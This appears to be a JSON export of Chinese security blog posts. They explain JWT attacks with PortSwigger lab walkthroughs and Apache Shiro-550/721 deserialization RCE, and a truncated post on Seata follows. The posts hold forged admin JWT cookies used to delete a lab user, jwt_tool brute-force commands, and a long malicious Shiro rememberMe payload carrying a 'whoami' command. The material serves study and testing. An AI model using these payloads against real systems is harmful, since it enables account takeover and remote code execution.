[{"content":"什么是JWT https://xz.aliyun.com/t/6776\nJWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。\njwt由三个部分组成：header-payload-signature\nheader头 header部分最常用的两个字段是alg和typ，alg指定了token加密使用的算法（最常用的为HMAC和RSA算法），typ声明类型为JWT\n1 2 3 4 { \u0026#34;alg\u0026#34; : \u0026#34;HS256\u0026#34;, \u0026#34;typ\u0026#34; : \u0026#34;jwt\u0026#34; } payload部分 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;user_role\u0026#34; : \u0026#34;finn\u0026#34;, //当前登录用户 \u0026#34;iss\u0026#34;: \u0026#34;admin\u0026#34;, //该JWT的签发者 \u0026#34;iat\u0026#34;: 1573440582, //签发时间 \u0026#34;exp\u0026#34;: 1573940267, //过期时间 \u0026#34;nbf\u0026#34;: 1573440582, //该时间之前不接收处理该Token \u0026#34;domain\u0026#34;: \u0026#34;example.com\u0026#34;, //面向的用户 \u0026#34;jti\u0026#34;: \u0026#34;dff4214121e83057655e10bd9751d657\u0026#34; //Token唯一标识 } { \u0026#34;name\u0026#34;: null, \u0026#34;id\u0026#34;: 20, \u0026#34;username\u0026#34;: \u0026#34;Lsec\u0026#34;, \u0026#34;exp\u0026#34;: 1735428521 //时间戳 } signature部分 signature的功能是保护token完整性。\n生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。\n抽象成公式就是\n1 signature = HMAC-SHA256(base64urlEncode(header) + \u0026#39;.\u0026#39; + base64urlEncode(payload), secret_key) 值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充\u0026quot;=\u0026ldquo;号，并将标准Base64中的\u0026rdquo;+\u0026ldquo;和\u0026rdquo;/\u0026ldquo;分别改成了\u0026rdquo;-\u0026ldquo;和\u0026rdquo;-\u0026quot;。\nPython生成Token 1 2 3 4 5 import jwt encoded_jwt = jwt.encode({\u0026#39;user_name\u0026#39;: \u0026#39;admin\u0026#39;}, \u0026#39;key\u0026#39;, algorithm=\u0026#39;HS256\u0026#39;) print(encoded_jwt) print(jwt.decode(encoded_jwt, \u0026#39;key\u0026#39;, algorithms=[\u0026#39;HS256\u0026#39;])) Java生成Token 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // 生成JWT @Test public void TestJwt(){ Map\u0026lt;String, Object\u0026gt; claims = new HashMap\u0026lt;\u0026gt;(); claims.put(\u0026#34;id\u0026#34;,1); claims.put(\u0026#34;name\u0026#34;,\u0026#34;Lsec\u0026#34;); String jwt = Jwts.builder() .signWith(SignatureAlgorithm.HS256, \u0026#34;Lsec\u0026#34;) //签名算法 .setClaims(claims) //载荷 .setExpiration(new Date(System.currentTimeMillis() + 3600 * 1000)) //设置令牌有效期为1小时 .compact(); System.out.println(jwt); } // JWT令牌解析--还原JWT令牌数据 @Test public void testParseJwt(){ Claims lsec = Jwts.parser() .setSigningKey(\u0026#34;Lsec\u0026#34;) //密钥 .parseClaimsJws(\u0026#34;eyJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiTHNlYyIsImlkIjoxLCJleHAiOjE3MzE5NDY4ODZ9.WKZnuIlIKcOwaKIpt_pkQR5nIRtrDOByXyI8TCsJCcw\u0026#34;) .getBody(); System.out.println(lsec); } Jwt常出现的问题 https://portswigger.net/web-security/all-labs#jwt Burp靶场\nhttps://mp.weixin.qq.com/s/C1YDIKXOw7atNyefbe2TJg 靶场解题攻略\n通过未经验证的签名绕过 JWT 身份验证 使用wiener:peter进行登录，发现网站会返回JWT进行认证，使用JWT进行解密，替换sub字段\n直接修改字段网站可能会不显示，但是可以根据JWT的加密进行修改，payload部分有base64进行加密，只需要将payload部分提取出来进行解密即可\n访问删除连接成功删除用户\n通过有缺陷的签名验证绕过 JWT 身份验证 什么叫签名缺陷？有些JWT解密后确实存在加密算法，但是只需要将header中的alg更改为none即可绕过签名限制，将alg更改为none之后记得删除签名字段\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 GET /admin/delete?username=carlos HTTP/2 Host: 0a7400d804d7cc1e812212bc00bc00ed.web-security-academy.net Cookie: session=eyJraWQiOiI1NWJlZTNjNy04NjAxLTRhM2YtYjJjOC0xYzNiOTgwNmU4MTgiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MDM4NSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9. User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Priority: u=0, i Te: trailers 通过弱签名密钥绕过 JWT 身份验证（爆破jwt密钥） 常见JWT爆破工具：jwt_tool 1 2 3 4 5 6 7 8 9 10 11 12 13 检查令牌的有效性测试已知漏洞： (CVE-2015-2951) alg=none签名绕过漏洞 (CVE-2016-10555) RS / HS256公钥不匹配漏洞 (CVE-2018-0114)密钥注入漏洞 (CVE-2019-20933/CVE-2020-28637)空白密码漏洞 (CVE-2020-28042)空签名漏洞 扫描错误配置或已知弱点 模糊声明值以引发意外行为 测试机密/密钥文件/公共密钥/ JWKS密钥的有效性通过高速字典攻击识别弱键 伪造新的令牌标头和有效载荷内容，并使用密钥或通过其他攻击方法创建新签名 时间戳篡改 RSA 和 ECDSA 密钥生成和重建（来自 JWKS 文件） 1 2 3 4 #爆破JWT -d 指定自定义字典 python jwt_tool.py eyJraWQiOiI1ZDY0YmNiYy0zMzUxLTQ1YmUtYjkxNS04YWY4ZmRmZTkyMmMiL CJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MTgyMiwic3ViIjoi d2llbmVyIn0.HCINz9uNuMWbIYjWXV5oUI2adMDT9yz6ETofdBTXE6A -C -d jwt-secrets.txt 爆破出密钥为secret1，直接使用jwt.io在线编辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 GET /admin/delete?username=carlos HTTP/2 Host: 0a5e00f6036480bab9b18738008400b9.web-security-academy.net User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Sec-Websocket-Version: 13 Origin: https://0a5e00f6036480bab9b18738008400b9.web-security-academy.net Sec-Websocket-Key: JL91NnXespEIBGdR0it21A== Cookie: session=eyJraWQiOiI1ZDY0YmNiYy0zMzUxLTQ1YmUtYjkxNS04YWY4ZmRmZTkyMmMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNTM5MTgyMiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.y4bodw8-TE3ImwJfCPMrR25Ax4l9CvKkOcEo55nhiz0 Sec-Fetch-Dest: empty Sec-Fetch-Mode: websocket Sec-Fetch-Site: same-origin Pragma: no-cache Cache-Control: no-cache Upgrade: websocket 通过 jwk 标头注入绕过 JWT 身份验证 JWT头部注入 如果服务器端使用一个非常脆弱的密钥，我们甚至有可能一个字符一个字符地来暴力破解这个密钥，根据JWS规范只有alg报头参数是强制的，然而在实践中JWT报头通常包含几个其他参数，以下是攻击者特别感兴趣的：\n1 2 3 jwk(JSON Web Key)：提供一个代表密钥的嵌入式JSON对象 jku(JSON Web Key Set URL)：提供一个URL，服务器可以从这个URL获取一组包含正确密钥的密钥 kid(密钥id)：提供一个ID，在有多个密钥可供选择的情况下服务器可以用它来识别正确的密钥，根据键的格式这可能有一个匹配的kid参数 下面我们介绍如何通过JWK参数注入自签名的JWT，JWS(JSON Web Signature)规范描述了一个可选的jwk header参数，服务器可以使用该参数以jwk格式将其公钥直接嵌入令牌本身，您可以在下面的JWT head中看到具体的示例\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;kid\u0026#34;: \u0026#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;jwk\u0026#34;: { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m\u0026#34; } } Burp靶场演示：Burp安装个JWT Editor插件\u0026mdash;生成一个New RSAKey\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;p\u0026#34;: \u0026#34;8J0fgpxQpZOvPGb2rRsJB6Bh0lgvxRtp_Ilc7NmpI3UgEUiArSey091pT3X6lIPRZLdMf_eeYo_PWh5aq79Ps_xoZHtAz4VrR9sR8tCkND-z0KKBmopkUrowJie368xoWDU53P-4qxEfCfqPPxoZZRzhE7cse0PUVayNAJC01FU\u0026#34;, \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;q\u0026#34;: \u0026#34;1zMkdJNLYEdZYvZ31B15CmCfI9dOGEpn6lyXOEBPsqrP554x_8dXZnXSHbybiYyeLgl6i_JubJBqjeSAejwHh9v-e3-R9-7Dgg4lB_OUNqsg7yM3mcpZn7IHeGVKj9BjhigWsbUXFuwM1iEDK4TDmTV4-tO9UMsIBQA1SFlUTA8\u0026#34;, \u0026#34;d\u0026#34;: \u0026#34;Ayw2AASn_yn6EwjqCts6_gP6NZ9BlNhCG1iuDTX9h_AGWYBtUepdgp4CaM098ZyjH2Da3RvonFVlTOwHTgVAdkb2eWqeMejMjUji3cKIQRU_r0UeY3C4q8BBuWjwzF7ZTeVDgbx05NfeUW0LwWE3mFBuPDy6tmvYdekcs8Ft7GDmU_ToPZaGnMoEKzVlMyDb82LgkB7qWw2H4UoXHWR0l_RS90gTjkJzMc4Fmu4CoPfmqw8jLnGgq8GhAzpecc-VLvqel3tSY0fKqF5Y3U2SooL27vJJxX0kLgHVbcTNvCcS8XZArdhWTekV923jtspoNDYn5HfhAlLglCcwQcOSYQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;fa018615-0392-4d15-89bb-a2c637d9adbd\u0026#34;, \u0026#34;qi\u0026#34;: \u0026#34;XO3HEFj8PCxFz4DIw0djHjTrW4Krm-Oim-U4bmuEdmPDKKTIYYvkPVoSRR-4kCHkCx2aDsraUbNkTyEYC4dRUbnWl6xr2HxaLZIsxOglYsa939l_m6NXSzttAGrPpWqoURT7t6ihSmBnGDJDsMS3c1gWJKZsAYkeXy5lI2IhGks\u0026#34;, \u0026#34;dp\u0026#34;: \u0026#34;0gfldIZsY0w5_9jE5LAfvreCDDGMaVsXtihVpC4PVXMs7clDAWMQ152DCqiqdi9mfar_LQkCCXkM_9ZVQWw675qZqXRpS3xj_BI_ZZw4aZ9dn_XqefLpxcjetL-g7US9pJm5i67xDOpiFLzRg7yNhFSkKCiRvHumAq8fWen23w0\u0026#34;, \u0026#34;dq\u0026#34;: \u0026#34;QcZI6zSmAjxsjrnkcDm96DUWDv9cyEHdtx0rvy6w7VwWBaYthA8qoI98dEhUhdsr8chF44Zqx9XwK4Re3H2Ck7zi8F5SgCRDL3ohSWfisj7l5xGtidz2PcBNVjgnbQN1l-ii3xgJgaEOX1hhvqhqnGZins-e-pXD0rt4ja93-3M\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w\u0026#34; } 抓包，将attack和sign都设置为新签名，修改payload越权到administrator即可\n通过 jku 标头注入绕过 JWT 身份验证 有些服务器可以使用jku(jwk Set URL)头参数来引用包含密钥的JWK集，而不是直接使用JWK头参数来嵌入公钥，当验证签名时，服务器从这个URL获取相关的密钥，这里的JWK集其实是一个JSON对象，包含一个代表不同键的JWK数组，下面是一个简单的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 { \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;75d0ef47-af89-47a9-9061-7c02a610d5ab\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ\u0026#34; }, { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw\u0026#34; } ] } 通过算法混淆绕过 JWT 身份验证 算法混淆攻击(也称为密钥混淆攻击)是指攻击者能够迫使服务器使用不同于网站开发人员预期的算法来验证JSON web令牌(JWT)的签名，这种情况如果处理不当，攻击者可能会伪造包含任意值的有效jwt而无需知道服务器的秘密签名密钥 JWT可以使用一系列不同的算法进行签名，其中一些，例如:HS256(HMAC+SHA-256)使用\u0026quot;对称\u0026quot;密钥，这意味着服务器使用单个密钥对令牌进行签名和验证，显然这需要像密码一样保密\n","date":"2025-06-10T22:40:26+08:00","image":"https://lserein.github.io/p/jwt%E6%94%BB%E9%98%B2/jwt_hu_e133807af62d3807.jpg","permalink":"https://lserein.github.io/p/jwt%E6%94%BB%E9%98%B2/","title":"JWT攻防"},{"content":"1.Shiro框架介绍 shiro反序列化详解（多个复现场景），看完就是赚到\nApache Shiro 是一个强大且灵活的安全框架，主要用于身份验证、授权、加密和会话管理。它可以帮助开发者轻松地实现用户权限控制，确保应用程序的安全性。\nApache Shiro反序列化漏洞分为两种：Shiro-550、Shiro-721\n2.漏洞产生原理 Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。 **在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 ** 那么，Payload产生的过程： 命令=\u0026gt;序列化=\u0026gt;AES加密=\u0026gt;base64编码=\u0026gt;RememberMe Cookie值 数据\u0026mdash;\u0026ndash;\u0026gt;序列化\u0026mdash;\u0026ndash;\u0026gt;aes加密\u0026mdash;\u0026mdash;\u0026gt;base64\u0026mdash;\u0026mdash;\u0026gt;存储再rememberMe中rememberMe\u0026mdash;\u0026mdash;\u0026ndash;\u0026gt;base64解码\u0026mdash;-\u0026gt;aes解密\u0026mdash;\u0026mdash;\u0026gt;反序列化 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。 3.漏洞影响版本 Shiro-550： Apache Shiro \u0026lt; 1.2.4\nShiro-721： Apache Shiro = 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1\n4.漏洞挖掘思路 4.1.黑盒挖掘 由于Shiro是一个身份验证，授权加密的框架，所以常出现点就是在登录框，在登录的时候抓包，看Cookie字段是否存在RememberMe等字段，或使用burp的一些被动扫描插件判断是否使用了Shiro框架\n当发现使用Shiro框架后，就可以使用一把梭工具进行测试是否存在Shiro漏洞\n爆破密钥，检测利用链\n1 2 3 4 5 6 7 8 9 10 GET / HTTP/1.1 Cookie: rememberMe=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 Authorization: Basic d2hvYW1p Accept: text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.8 Cookie: JSESSIONID=12D77B15B8ABEE32B592B283EB1D46AA Host: 192.168.165.252:8088 Connection: close 返回包内容为执行命令返回结果后base64加密的内容\n4.2.白盒挖掘 查看项目的pom.xml或依赖是否使用Shiro框架\nShiro版本是否是存在漏洞的版本，查看Shiro的AES加密密钥\nAES的密钥Key一般在项目的配置文件中，如果是默认的Key，那么项目的默认文件会找不到，而是在实现RememberMeManager的方法内，采用硬编码\n5.Shiro反序列化利用 5.1.Shiro550 影响版本：Apache Shiro \u0026lt; 1.2.4\n可以看到Shiro版本为1.2.4时，默认AES加密Key是硬编码在代码中的\n注意：如果手动打的话，要删除掉数据包中的sessionId，如果数据包中存在SessionId，那么就不会读取RememberMe\n5.2.Shiro721 Shiro-721： Apache Shiro = 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1\n但当Shiro版本为1.2.4以上时，AES加密Key采用随机生成的方式\n因为shiro721用到的加密方式是AES-CBC，而且其中的ase加密的key基本猜不到了，是系统随机生成的。而cookie解析过程跟cookie的解析过程一样，也就意味着如果能伪造恶意的rememberMe字段的值且目标含有可利用的攻击链的话，还是能够进行RCE的。\n使用工具进行爆破，发现爆破失败\nShiro721是使用 登录后rememberMe= {value}去爆破正确的key值 进而反序列化，shiro721 本质上是 padding attack，爆破要弄很久很久。对比Shiro550条件只要有 足够密钥库 （条件较低）、Shiro721需要登录（要求较高 ）。\n6.Shiro反序列化分析 shiro反序列化初入\n反序列化学习之路-Shiro550\n反序列化学习之路-Shiro-721 分析\n","date":"2025-06-10T15:06:06+08:00","image":"https://lserein.github.io/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Shiro_hu_97a7258629bde61d.jpg","permalink":"https://lserein.github.io/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Shiro反序列化"},{"content":"为什么要学习分布式事务Seata？ 场景：在微服务架构中，一个业务操作可能涉及多个服务的数据库（如订单服务、库存服务、支付服务），传统事务无法跨服务保证原子性（ACID 中的 Atomicity）。\nSeata 通过抽象事务协调、资源管理和模式支持，解决了微服务架构下分布式事务的核心痛点，帮助开发者在保证数据一致性的同时，兼顾性能和开发效率。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 